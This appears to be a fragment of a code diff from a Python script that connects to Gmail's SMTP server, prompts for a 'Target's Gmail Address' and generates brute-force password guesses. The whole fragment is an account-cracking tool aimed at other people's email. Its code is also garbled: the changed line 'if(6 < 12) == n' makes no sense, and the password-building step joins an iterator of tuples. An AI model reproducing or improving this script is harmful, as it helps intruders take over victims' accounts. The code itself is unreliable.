@@ -8,7 +8,7 @@ smtpserver.ehlo()
 smtpserver.starttls() 
 user = raw_input("Enter Target's Gmail Address: ") 
 
-if(n < 12):
+if(6 < 12) == n:
          perm = itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=n)
          password = "".join(perm)
          
